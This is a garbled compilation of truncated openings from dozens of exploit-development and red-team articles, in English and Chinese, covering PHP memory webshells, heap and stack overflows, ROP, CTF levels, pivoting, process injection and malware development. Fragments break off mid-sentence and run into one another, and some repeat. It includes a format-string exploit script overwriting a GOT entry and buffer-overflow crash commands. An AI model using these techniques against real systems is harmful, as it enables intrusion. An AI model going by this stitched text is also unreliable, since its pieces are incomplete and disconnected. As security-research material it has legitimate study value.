然而并不是没人做研究，可由于 PHP
语言的特性，他的一次执行生命周期，通常就是伴随着请求周期开始和结束的。因此，很难完成一段代码的内存长久驻留。目前网上如果搜索“PHP
内存马”，通常会发现两种模式：
1. “不死”马：所谓的不死马，其实就是直接用代码弄一个死循环，强占一个 PHP 进程，并不间断的写一个PHP
shell，或者执行一段代码。
2. Fastcgi马：这个利用了 [9]PHP-FPM 可以直接通过 fastcgi
协议通讯的原理，可以指定SCRIPT_FILENAME，去执行机器上存在的 PHP
文件；或者配合auto_prepend_file+php://input，通过每次提交POST
code去执行。（稍微感叹一下，这个问题从我写[10]fcgi_exp的代码，已过了整整10年）

Overview
In our previous [9]post, we discussed about Uninitialized Heap
Variable. This post will focus on another vulnerability, Use After
Free. As the name might suggest, we’d be exploiting a stale pointer,
that should’ve been freed, but due to a flaw, the pointer is called
through a Callback function, thus executing anything that we can put
into the memory there.

From fuzzing to 0-day
Written on May 14, 2014
A couple of days ago, I found an interesting bug during a fuzzing
session that led to me creating a 0-day exploit for it. I’ve been asked
a few times about the methods I use to find bugs and write exploits, so
I’ve decided to take this opportunity to describe one particular
workflow I use. In this post, I’ll take you through finding a bug,
analzying it, and creating a functional exploit.
In order to benefit from this post, you should be familiar with basic
fuzzing and exploit development.

Blind Return Oriented Programming (BROP)
When hacking software, there are three exploit scenarios:
1. Open-source (e.g., Apache)
2. Open-binary (e.g., Internet Explorer)
3. Closed-binary and source (e.g., some proprietary network service)
This work studies whether it is possible to attack the third case.
The BROP attack makes it possible to write exploits without possessing
the target's binary. It requires a stack overflow and a service that
restarts after a crash. Based on whether a service crashes or not
(i.e., connection closes or stays open), the BROP attack is able to
construct a full remote exploit that leads to a shell. The BROP attack
remotely leaks enough gadgets to perform the writ# Level 9

## Vulnerability

```memcpy()``` buffer overflow

## Context

We find a binary with owner bonus0 and SUID.
```
level9@RainFall:~$ ls -l
-rwsr-s---+ 1 bonus0 users 6720 Mar  6  2016 level9
```
When run, it does nothing.
```
level9@RainFall:~$ ./level9
level9@RainFall:~$ ./level9 hi
level9@RainFall:~$ ./level9 oh hi
level9@RainFall:~$
```

## Solution

Giving one long argument causes a segfault. We find the maximum input is 108 characters before segfaulting.
```
level9@RainFall:~$ ./level9 $(python -c 'print "A" * 108')
level9@RainFall:~$ ./level9 $(python -c 'print "A" * 109')
Segmentation fault (core dumped)
```

Investigating with gdb, we find this binary is compiled from C++ sou#[1]GitHub

Chromium RCE - v8 exploitation
Event: TCTF 2020 Quals
Problem Statement: It's v8, but it's not a typical v8, it's CTF v8! Please
enjoy pwning this d8 :)
INTRODUCTION
__________________________________________________________________
On 27.06.2020 I participated in [4]TCTF 2020 Quals with PwnThyBytes where we
ranked #17. Like always, a great CTF with cool challenges. However, because I
had some exams that overlapped with the competition I couldn't participate
for the entire period of it. During the CTF I tried an interesting challenge
which I will try to explain in this blog post.
In this challenge we are given a modified version of d8 which is running on a
s# Post exploitation

Abusing DNSAdmins privilege for escalation in Active Directory
UPDATE (November 2021) - After more than 4 years, Microsoft has
acknowledged this is as a vulnerability and released a patch. This is
now [9]CVE-2021-40469!
Yesterday, I read [10]this awesome post by Shay Ber here which details
a feature abuse in Windows Active Directory (AD) environment.  I rely
heavily on feature abuse during my red team engagements and always
rec# Import Adress Table (IAT) Hooking

## Overview

* Windows portable executable contains a structure called `Import Address Table (IAT)`&#x20;
* IAT contains pointers to information that is critical for an executable to do its job:&#x20;
  * a list of DLLs it depends on for providing the expected functionality
  * a list of function names and their addresses from those DLLs that may be called by the binary at some point
* It is possible to hook function pointers specified in the IAT by overwriting the target function's address with a rogue function address and optionally to execute the originally intended function

Below is a simplified diagram that attempts to visualize the flow of events b#[1]alternate [2]alternate

X86 Shellcode Obfuscation - Part 1
I decided to do research on shellcode obfuscation in order to see how
hard it would be to develop a tool that can take any binary x86
shellcode and generate the completely unique version from it.
Please note that such tool is most useful in scenarios when shellcode
has to be saved on disk (e.g. embedded inside an executable file).
Obfuscated shellcodes will greatly increase in size, which may not be a
desirable outcome, especially if such is to be embedded inside an

Sharks in the Pool :: Mixed Object Exploitation in the Windows Kernel Pool
Sep 6, 2017
Windows 7
In the past I have spent a lot of time researching web related
vulnerabilities and exploitation and whilst I’m relatively versed in
usermode exploitation, I needed to get up to speed on windows kernel
exploitation. To many times I have tested targets that have kernel
device drivers that I have not targeted due to the sheer lack of
knowledge. Gaining low privileged code execution is fun, but gainin#[1]RSS [2]Medium [3]alternate

Loading and Debugging Windows Kernel Shellcodes with Windbg. Debugging
DoublePulsar Shellcode
In this article i’d like to share a windbg script that will let us to
load a shellcode from a file to kernel memory and create a kernel
thread to execute it. I have not played a lot with the script yet, if
you find some bug please tell me.

### 1. ImageMagick 图片处理库简介

​	ImageMagick 是一个易于使用和功能强大的图片处理库，很重要的一点是ImageMagick 在比较多的后端应用中出现(比如说:WordPress和Discuz!).挖掘大型CMS 框架的漏洞的难度比较高，那么另一种思路则是通过挖掘CMS 框架使用到的第三方库漏洞让CMS 框架来触发(比如:PHPMailer等第三方库)。由ImageMagick 库引发的CVE-2016-3714 CVE-2016-5118 远程命令执行和两个月前的Yahoo! ImageMagick Heartbleed 已经足以说明从ImageMagick 中触发的漏洞对主机安全性的危害。那么接下来我们来讨论怎么把Fuzzing 技术应用到ImageMagick 的漏洞挖掘上。


### 2. ImageMagick 的使用方式

​	Fuzzing ImageMagick 之前，先来了解ImageMagick 库是怎么样使用的。

​	ImageMagick 在编译完成之后，在`utilities` 目录下会生成`magick`，这就是ImageMagick 图形库的命令行使用工具.`magick` 命令行工具使用如下：

 	 ./magick magick_command other_arguments

​	magick_command 指的是执行命令。有：identify (查看图像信息)，convert (图像处理与格式转换)等，更多命令通过以下链接查询：https://www.imagemagick.org/script/#[1]j00ru//vx tech blog » Feed [2]j00ru//vx tech blog » Comments Feed

In order to dump iBoot, you need:

1. Kernel read/write (eg task_for_pid 0)
2. gPhysBase and gVirtBase
3. A pointer to the kernel pmap's level1 translation table entries.

Once those are obtained, just add a mapping for gPhysBase to the level1 table (code for this is available upon request; drop me a pm on freenode), mapping 1GB of physical memory at a given virtual address.
Additionally, make sure to clear the read only bit and set the EL0-accessible bit. 

At this point, it's simple matter of memmem to figure out where iBoot is hiding in phys. Given a gPhysBase map  at 0xffffffc3c0000000, this code should do the trick.

Reading Your Way Around UAC (Part 2)
We left [5]Part 1 with the knowledge that normal user processes in a
split-token admin logon can get access
to Terminate, QueryLimitedInformation and Synchronize process access
rights to elevated processes. This was due to the normal user and admin
user having a Default DACL which grants Execute access to the current
Logon Session which is set for all tokens on the same desktop. The
question we're left with is how can this possibly be used to elevate
your privileges? Let's see how we can elevate our privileges prior to
Windows 10.

Empire Domain Fronting
So Domain Fronting seems to be the hot topic as of late. This will be
short, and I won’t repeat information in regards to what Domain
Fronting is and how it can be used to abuse high trust domains. For
detailed explanations and examples, please look over [4]this white
paper, as well as an excellent blog [5]post from Vincent Yiu. For
additional information, you can also take a look at another [6]post or
this [7]video by Raphael Mudge for implementation with Cobalt Strike.
The setup process for Domain Fronting in Empire is simple. Most of the
overhead will be required during the configuration of your chosen CDN.

Maximum Overkill Two - From Format String Vulnerability to Remote Code
Execution
Feb 22nd, 2015 1:01 pm
You might remember my first [6]Maximum Overkill writeup, where I made a
ROP exploit with ASLR/NX bypass for a simple buffer overflow exercise.
I completed another over-the-top, why-would-you-even-do-this exploit
for a CTF challenge and figured I’d shared it.
[7]ringzer0team has a very nice, long-running CTF going on. I already
did the [8]shellcoding challenges, which I really enjoyed. I completed

How to heap?
Posted on 2019-03-21
In this post, I will play with some classic heap exploitation tricks in
Linux Glibc, in order to better understand the linux kernel heap
management.
Background
Heap is a logically continuous area that consists of many chunks. For
heap allocator such as ptmalloc, the minimum operation unit is the
chunk. Chunks are classified into 4 different categories. 1. Allocated
chunk 2, Free chunk; 3, Top chunk; 4. Last Remainder chunk. malloc
maintains a finite state machine whitin the four types of chunks. A
detailed analysis of ptmalloc anylasis can be find here (in Chinese)

If you've got AFL working then even without a good seed or parallelisation it might find a crashing input in the order
of 15 minutes (subject to how fast your computer is and how lucky you get). It might take much longer.

With the cheater-seed from HINTS you should find a crash in just a few minutes.

With parallelisation and deferred forkserver / persistent mode you will get the corresponding performance increases
which should find a crash in a few minutes even without the seed.

Here's a sample crashing input after being put through the afl-tmin grinder:

    0000000000000000000=
    000000000000000000000000000000000000000000=

(now you can see why the sample seed was somewhat unfair)

Fuzzing sockets, part 1: FTP servers

In this post, I’ll share the results of the first part of my
socket-based fuzzing research. I’ll cover my fuzzing analysis of three
widely-used FTP servers as a practical example, and I’ll detail the
vulnerabilities that resulted from this effort.

背景
2018年10月18日，360威胁情报中心首次捕获到一例利用Excel 4.0宏传播Imminent
Monitor远控木马的在野攻击样本。而这离2018年10月6日国外安全厂商Outflank的安全研究人员首次公开使用Excel
4.0宏执行ShellCode的利用代码仅仅过去了10余天。虽然Excel
4.0宏技术已经发布超过20年，并且在该技术出现早期就被经常用于制作宏病毒，但事实上，由于Microsoft很早就使用VBA宏（Visual
Basic for Applications）来代替Excel 4.0宏技术，这导致Excel 4.0宏并不为大众所熟知。并且由于Excel
4.0宏存放在Excel 97 – 2003格式（.xls，复合二进制文件格式）的Workbook

During late 2004, ‘glibc malloc’ got hardened. After which techniques
such as unlink got obsolete, leaving the attackers clueless. But only

The art of persistence is (and will be...) a matter of concern when
successfully exploitation is achieved. Sometimes is pretty tricky to
maintain access on certain environments, specially when it is not
possible to execute common vectors like creating or adding users to
privileged groups, dumping credentials or hashes, deploying a

Fun With Info-Leaks
This article is about information leaks in form of memory disclosures
created in Internet Explorer 10 32-bit on Windows 7 64-bit. They are
used to bypass full ASLR/DEP to gain remote code execution. While the
software containing the bug might not be that popular, it’s quite nice
what can be done with the bug.
Reading this article requires some familiarity with [8]WinDbg, [9]heap
[10]spray , and [11]info-leaks.
Hope you enjoy it.

History
A short history on Data Execution Protection (DEP): it was created in order to prevent execution in memory in
areas that aren’t executable. Before trying this, I highly suggest reading skape and Skywing’s Article in
UnInformed called “ Bypassing Windows Hardware‐Enforced DEP”. This is a great article and is invaluable.
Skape and Skywing are amazing minds and are definitely superhumans in ASM.
Background
Let’s start off with the basics on a stack‐based overflow. These types of overflows are alNightSky Reversing Steps:
Check NightSky RW in hexeditor, DIE, Exeinfo, strings etc..
NightSky RW is VMProtected - F*ck
Unpack VMProtect (original code not mutated|VT only packer and imports destroyed) -OK
Rebuild Imports in IDB -OK
Rebuild unpacked sample with reconstructed imports -OK
Reapair sample to be debuggable -> ASLR, Base, relocation, entrypoint etc etc.. -OK
Finding out it is using statically linked "MBED TLS" Crypto OpenSource lib -> Big mess F*ck
Generate FLIRT signatures ???
Trying out what linker and version was used -> Rich Header shredded -> F*ck
Trying out what linker and version was used again from optionalheader(linker ver.) + DIE -> MSVC 14.00

Sigreturn Oriented Programming is a real Threat
Rémi Mabon1
Abstract: This paper shows that Sigreturn Oriented Programming (SROP), which consists of using
calls to sigreturn to execute arbitrary code, is a powerful method for the development of exploits.
This is demonstrated by developing two different kinds of SROP based exploits, one asterisk exploit
which was already portrayed in the paper presenting SROP, and one novel exploit for a recently
disclosed bug in the DNS address resolution of the default GNU C library. Taking advantage of
the fact, that th#[1]bluescreenofjeff.com - a blog about penetration testing and red

- `cmd.exe`, `powershell.exe`, `/bin/sh` etc.
- Two flavours: One-off execution `cmd /c <COMMAND>` or spawn once, attach to standard `in/out/error`
- Commands such as `whoami`, `hostname`, `net <COMMAND>`, `ipconfig`, `netstat`, `netsh`, `route`, `tasklist`, `wmic`, `systeminfo`. Especially when ran in a short amount of time.
- Monitoring: Sysmon process create

Introduction to pivoting, Part 1: SSH
Written on October 6, 2012
Pivoting is a technique that allows attackers to use a compromised
system to attack other machines in the same network, or more
devastatingly, machines in another network that the compromised machine
has access to. There are several techniques that can be used to pivot
deeper into the network, and I’ll be describing some of them in the
next few articles. I’ve found that this topic can be a bit confusing to
beginners, and I hope that these articles will help clear things up. In## Owner:

When we run binary it asks user for input and as soon as I saw the glimpse of being asked for input I had a feeling of usage of gets function which is vulnerable to buffer overflows by default as
it will read user input as long as it doesn't encounter a newline character.

A Red Teamer's guide to pivoting
Mar 23, 2017
Penetration testers often traverse logical network boundaries in order
to gain access to client’s critical infrastracture. Common scenarios
include developing the attack into the internal network after
successful perimeter breach or gaining access to initialy unroutable
network segments after compromising hosts inside the organization.
Pivoting is a set of techniques used during red team/pentest
engagements which make use of attacker-controlled hosts as logical
network hops with the aim of amplifying network visibility. In this
post I’ll cover common pivoting techniques a* Email: [1][email protected]

What is ROP?
Return Oriented Programming (ROP) is a powerful technique used to
counter common exploit prevention strategies. In particular, ROP is
useful for circumventing Address Space Layout Randomization
(ASLR)^[14]1 and DEP^[15]2. When using ROP, an attacker uses his/her
control over the stack right before the return from a function to
direct code execution to some other location in the program. Except on

Introduction
This document will be an overview of a very basic buffer overflow. We
will see the exploitation of a vulnerable program compile in 32 bits on
an x86 architecture.
A buffer overflow is a bug that appears when a process writes in a
memory buffer (stack or heap) and exceeds the allocated memory,
overwriting some information used by the process. When this bug appears

new features, techniques and improvements. This blog post dives into
the technical details of many of them.

This project is aimed to find which pins exposed by the target device are JTAG
pins. It does so by enumerating throughout the provided pins set and trying to
abuse some JTAG features, such as BYPASS and IDCODE registers.

It is written in Go and supposed to be used under Linux (or any OS which Go
supports) on the device with GPIO lines exported to userspace. Raspberry Pi 1,2,3 is the
most famous example.

The tool drives GPIO either using

OSCP-Like Buffer Overflow Walkthrough

What is a Buffer Overflow?
Simply put, a buffer overflow occurs when inputted data occupies more
space in memory than allocated. The excess data may overwrite adjacent
memory locations, potentially altering the state of the application.
A Buffer overflow can be leveraged by an attacker with a goal of
modifying a computer’s memory to undermine or gain control of the

Use-After-Silence: Exploiting a quietly patched UAF in VMware
June 27, 2017 | Abdul-Aziz Hariri
[19]SUBSCRIBE
Springtime around the Zero Day Initiative (ZDI) means ramping up for
the [20]Pwn2Own (P2O) competition held each year at the CanSecWest
conference. To say the least, it’s a busy time to be a ZDI researcher
as we build targets, answer contestant questions, and review program
submissions. This year was no different. In 2016# Exploit Development: Case Studies

This repository is intended as a personal list of exploit development case studies I stumble upon during my work. My categorization is not very granular — I'm skipping differentiation between user-mode and kernel-mode, as well as type of the software being exploited. Exploit primitives are what's really important, therefore the only two categories I'm using are *Windows* and *Unix-like* (including Linux, Android, MacOS, iOS, BSDs, _et cetera_).

Exploiting the DRAM rowhammer bug to gain kernel privileges
Posted by Mark Seaborn, sandbox builder and breaker, with contributions

[This guest post continues Project Zero’s practice of promoting
excellence in security research on the Project Zero blog]

“Rowhammer” is a problem with some recent DRAM devices in which
repeatedly accessing a row of memory can cause bit flips in adjacent
rows. We tested a selection of laptops and found that a subset of them
exhibited the problem. We built two

Process Injection
Process injection is an age old technique used by malware for 3 main
reasons: Running without a process, placing user-mode hooks for a
rootkit or formgrabber, and bypassing antivirus / firewalls by
injecting whitelisted processes. The most common method of process
injection is DLL Injection, which is popular due to how easy it is. A

How to heap?
Posted on 2019-03-21
In this post, I will play with some classic heap exploitation tricks in
Linux Glibc, in order to better understand the linux kernel heap
management.
Background
Heap is a logically continuous area that consists of many chunks. For
heap allocator such as ptmalloc, the minimum operation unit is the
chunk. Chunks are classified into 4 different categories. 1. Allocated
chunk 2, Free chunk; 3, Top chunk; 4. Last Remainder chunk. malloc
maintains a finite state machine whitin the four types of chunks. A
detailed analysis of ptmalloc anylasis can be find here (in Chinese)
[5]ptmalloc code review in glibc Blind Return Oriented Programming (BROP)
When hacking software, there are three exploit scenarios:
1. Open-source (e.g., Apache)
2. Open-binary (e.g., Internet Explorer)
3. Closed-binary and source (e.g., some proprietary network service)
This work studies whether it is possible to attack the third case.
The BROP attack makes it possible to write exploits without possessing
the target's binary. It requires a stack overflow and a service that
restarts after a crash. Based on whether a service crashes or not
(i.e., connection closes or stays open), the BROP attack is able to
construct a full remote exploit that leads to a shell. The BROP attack
remotely leaks enough gadgets to perform the writ[1]FuzzySec

This week, [3]Capt. Meelo released a great [4]blog post on how to call
the NtCreateUserProcess API as a substitue for the typical Win32
[5]CreateProcess API. This post will build upon Meelo’s, so I highly
encourage you to read it first.
TL;DR, this code (not counting ntdll.h) is the bare minimum to spawn

Shortly after that I started working on a tool to exploit them on iOS,
in order to add the tfp0 kernel patch that has been missing from
Pangu’s 9.0 and 9.2-9.3.3 jailbreaks. On December 4th, my tool had
advanced enough for me to release [7]a proof of concept video, it was

Malware development part 1 - basics
Introduction
This is the first post of a series which regards development of
malicious software. In this series we will explore and try to implement
multiple techniques used by malicious applications to execute code,
hide from defenses and persist.
Let’s create a C++ application that will run malicious shellcode while
trying to not be caught by AV software.
Why C++ and not C# or PowerShell script? Because it’s much more
difficult to analyze compiled binary when compared to managed code or
script.

Bypassing NX bit using return-to-libc
Posted on [13]May 8, 2015July 5, 2015 by [14]sploitfun
Prerequisite:
1. [15]Classic Stack Based Buffer Overflow
VM Setup: Ubuntu 12.04 (x86)
In previous posts, we saw that attacker
* copies shellcode to stack and jumps to it!!
in order to successfully exploit vulnerable code. Hence to thwart
attacker’s action, security researchers came up with an exploit
mitigation called “NX Bit”!!
What is NX Bit?
Its a1. Find Shell Injection/OS Command Execution vulnerability 


Shell injection is generally considered one of the most dangerous vulnerabilities because it can be used to gain complete control over a target server. Although server and OS hardening can help to limit the impact and make it harder for an attacker to escalate privileges, there is still significant risk. Privilege escalation usually takes the following path:

- Find Shell injection vulnerability. Leverage the vulnerability to gain further shell access by creating a custom shell script accessible to the attacker. This can take many forms, most simply a new, dedicated PHP page which acts as a shell. By default, this shell will have # Level 3

## Vulnerability

printf() format string attack

## Context

level3@RainFall:~$ ls -l
-rwsr-s---+ 1 level4 users 5366 Mar  6  2016 level3
level3@RainFall:~$ ./level3
hello

```
We have a binary that prints input from the stdin. 

## Solution
Let's take a look at the binary in gdb. <br/>
We can see here that ```level3``` makes a call to ```main()```, which makes a call to a function ```v()```. <br/>

A few weeks ago I have published an article about WINRAR 0DAY.
That article revealed a new vulnerability that gave attackers, the
ability to perform spoofing attack.
Many people wrote to me about the problems of that kind of article
([5]for example).
So this time I’m goanna reveal a new 0DAY that will help security
managers to protect their web sites against many vulnerability scans.
A lot of sites owners will tell you that the majority numbers of scans,
performed against their sites, are performed by automatic tools like
NESSUS, ACUNETIX, and APPSCAN.

## Vulnerability

这个 post 偏向于复习之前 stack 部分 off by one 这样的安全问题，不过目前关注的是堆安全中的 off by one，需要有事先了解 ptmalloc2 基本的工作流程。
实验放在 fedora 24 上面进行，glibc 版本 2.20 (下载开发仓库 checkout 出来的)。

> what's is off-by-one ?

其实在 stack 部分已经出现过 off by one 问题，概括而言就是:当 copy 一个字符串切目标地址的位置是在`heap`上且其源长度等于目标长度会导致字符串的尾部的`NULL`覆写下一个`chunk`的`chunk header`，这样可能会导致任意代码执行。

## 0x01 the chunk of glibc

在来回顾一下 glibc 中 malloc 的实现

```c
/*
  This struct declaration is misleading (but accurate and necessary).
  It declares a "view" into memory allowing access to necessary
  fields at known offsets from a given base. See explanation below.
*/

struct malloc_chunk {

  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */#[1]GitHub

Fuzzing workflows; a fuzz job from start to finish
By [12]@BrandonPrry
Many people have garnered an interest in fuzzing in the recent years,
with easy-to-use frameworks like American Fuzzy Lop showing incredible
promise and (relatively) low barrier to entry. Many websites on the
internet give brief introductions to specific features of AFL, how to
start fuzzing a given piece of software, but never what to do when you
decide to stop fuzzing (or how you decide in the first place?).

What is ROP?
Return Oriented Programming (ROP) is a powerful technique used to
counter common exploit prevention strategies. In particular, ROP is
useful for circumventing Address Space Layout Randomization
(ASLR)^[14]1 and DEP^[15]2. When using ROP, an attacker uses his/her
control over the stack right before the return from a function to
direct code execution to some other location in the program. Except on

# Buffer overflow
To find and exploit a buffer overflow the following steps should be executed:
   1. **Spiking:** Find the vulnerable parameter
   2. **Fuzzing:** Get the amount of bytes the program crashes
   3. **Find the offset:** Get the amount of bytes to write to the EIP
   4. **Overwriting the EIP**
   5. **Find bad characters:** Run all hex characters through the program
   6. **Finding the right module:** Look for a ddl without memory protections
   7. **Generating shellcode:** To get a reverse shell or to run calc
   
Make sure you got immunity debugger + mona.py installed

5 — Finding the offset
In the previous section, we used a fuzzing script to find an
approximate bytes site where it crashed. Now, we need to find the
offset where the “EIP” was overwritten because that’s what we want to
control from this point on. For this purpose, we need to generate a
unique pattern using the Metasploit tool andThe Geometry of Innocent Flesh on the Bone:
Return-into-libc without Function Calls (on the x86)
Hovav Shacham∗

Full version of an extended abstract published in Proceedings of ACM CCS 2007, ACM Press, 2007.
Abstract
We present new techniques that allow a return-into-libc attack to be mounted on x86 exe-
cutables that calls no functions at all. Our attack combines a large number of short instruction
sequences to build gadgets that allow arbitrary computation. We show how to discover such
instruction sequences by means of static analysis. We make use, in an essential way, of the
properties of the x86 instruction set.

Exploit: fmt-4.py

```
import struct
### address of hello 0x080484b4
#exit_plt = struct.pack("I",0x8049724+2) ## address of starting bytes
exit_plt = struct.pack("I",0x8049724) ## address of least sign. bytes
## how to find exit_plt?
## find the call to exit@plt in the disassembly and then disassamble the address
## disassmble 0x80483ec which would disassemble plt instructions.
## Now you will notice jmp instruction which is jumping to got section
## so now just x [address] which would look like x 0x8049724 
## 0x8049724 <_GLOBAL_OFFSET_TABLE_+36>:	0x080483f2

payload = "AAAA"
payload += exit_plt
payload += "%33964d%5$hn"
print payload
```

![POC](https://github# Level 0

## Vulnerability

gdb disassembly reveals hardcoded password

## Context

In our home directory we find a binary with SUID and owner ```level1```
```
level0@RainFall:~$ ls -l
-rwsr-x---+ 1 level1 users 747441 Mar  6  2016 level0
```

## Solution

Let's start by logging in from a separate shell.
```
>$ ssh level0@{VM_IP} -p 4242
level0@192.168.0.17's password: level0
```
If we run the binary ```level0``` without arguments it segfaults
```
level0@RainFall:~$ ./level0
Segmentation fault (core dumped)
```
If we run it with random arguments it prints "No !"
```
level0@RainFall:~$ ./level0 hello
No !
```
Let's have a closer look in gdb.
```
level0@RainFall:~$ gdb -q level0

Abstract
We describe a methodology to automatically turn arbitrary ARMv8
programs into alphanumeric executable polymorphic shellcodes. Shell-
codes generated in this way can evade detection and bypass filters,
broadening the attack surface of ARM-powered devices such as smart-
phones.

This part will cover the first real obstacle you will encounter when
writing exploits. The “Structured Exception Handler (SEH)” is a
protection mechanism that was implemented to mitigate the abuse of
buffer overflows but as we will see it is a highly flawed one. It is
worth mentioning that this tutorial will not cover SafeSEH or SEHOP, I

X86 Shellcode Obfuscation - Part 1
I decided to do research on shellcode obfuscation in order to see how
hard it would be to develop a tool that can take any binary x86
shellcode and generate the completely unique version from it.
Please note that such tool is most useful in scenarios when shellcode
has to be saved on disk (e.g. embedded inside an executable file).
Obfuscated shellcodes will greatly increase in size, which may not be a
desirable outcome, especially if such is to be embedded inside an

ABSTRACT
In the cyberworld, specialized virtual environments are used to

spreading and damaging real users’ personal data, important
corporate assets, etc. These environments are called sandboxes.
Most modern malware, even those that perpetrate relatively
simple attacks, try to evade sandboxes by using different

Fuzzing workflows; a fuzz job from start to finish
By [12]@BrandonPrry
Many people have garnered an interest in fuzzing in the recent years,
with easy-to-use frameworks like American Fuzzy Lop showing incredible
promise and (relatively) low barrier to entry. Many websites on the
internet give brief introductions to specific features of AFL, how to
start fuzzing a given piece of software, but never what to do when you
decide to stop fuzzing (or how you decide in the first place?).
